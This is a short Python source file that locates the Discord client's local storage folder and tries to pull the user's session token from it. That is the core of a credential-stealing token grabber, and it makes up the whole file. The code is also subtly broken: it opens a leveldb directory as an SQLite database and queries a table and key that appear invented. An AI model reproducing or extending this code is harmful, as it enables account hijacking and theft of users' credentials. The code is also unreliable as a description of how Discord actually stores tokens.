import os
import sqlite3
import base64
from pathlib import Path

def find_ldb_file():
    """
    Searches for the local storage file (ldb file) of the Discord client on the user's computer.
    Returns the path to the ldb file if found, otherwise None.
    """
    # Define the possible paths where the ldb file might be located
    possible_paths = [
        str(Path.home() / 'AppData' / 'Local' / 'Discord' / 'Local Storage' / 'leveldb'),
        str(Path.home() / 'Library' / 'Application Support' / 'discord' / 'Local Storage' / 'leveldb')
    ]

    for path in possible_paths:
        if os.path.exists(path):
            return path
    return None

def extract_token_from_ldb(ldb_path):
    """
    Extracts the Discord user's token from the ldb file.
    :param ldb_path: Path to the ldb file.
    :return: Discord user's token if found, otherwise None.
    """
    # Connect to the ldb database
    conn = sqlite3.connect(ldb_path)
    cursor = conn.cursor()

    # Query to find the token
    cursor.execute("SELECT * FROM ItemTable WHERE key = 'discord_token'")
    result = cursor.fetchone()

    if result:
        token = base64.b64decode(result[1]).decode('utf-8')
        return token
    else:
        return None